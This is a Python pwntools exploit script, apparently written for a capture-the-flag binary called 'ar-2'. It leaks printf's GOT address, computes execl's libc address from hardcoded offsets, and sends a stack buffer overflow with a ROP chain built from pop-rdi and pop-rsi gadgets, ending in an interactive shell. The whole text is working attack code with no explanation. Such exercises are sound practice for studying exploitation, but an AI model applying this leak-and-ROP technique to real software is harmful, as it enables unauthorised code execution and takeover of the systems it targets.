#!/usr/bin/env python

from pwn import *
import os

p = process("./ar-2")

printf_got = p.elf.got['printf']
print(hex(printf_got))

print(p.recvrepeat(0.01))
length = 8
p.sendline(str(length))

print(p.recvrepeat(0.01))
p.sendline(hex(printf_got))

p.recvline()
data = p.recv()
print(repr(data))
values = data.split(' ')
value = data.split('P')
#print(u(value[0]))
#print(u64(value[0]))

#$1 = {<text variable, no debug info>} 0x7f6f68c7aa20 <__GI_execl>
#$2 = {<text variable, no debug info>} 0x7f6f68c03800 <__printf
execl = u64(value[0]) - 0x7f6f68c03800 + 0x7f6f68c7aa20
print(hex(execl))

#0x0000000000400a33 : pop rdi ; ret
#0x0000000000400a31 : pop rsi ; pop r15 ; ret
#0x400020:  "@"
pr = p64(0x0000000000400a33)
ppr = p64(0x0000000000400a31)
string = p64(0x400020)
buf = "A"*0x80 + "A"*8
buf += pr
buf += string
buf += ppr
buf += p64(0)
buf += p64(0)
buf += p64(execl)

p.sendline(buf)
p.interactive()
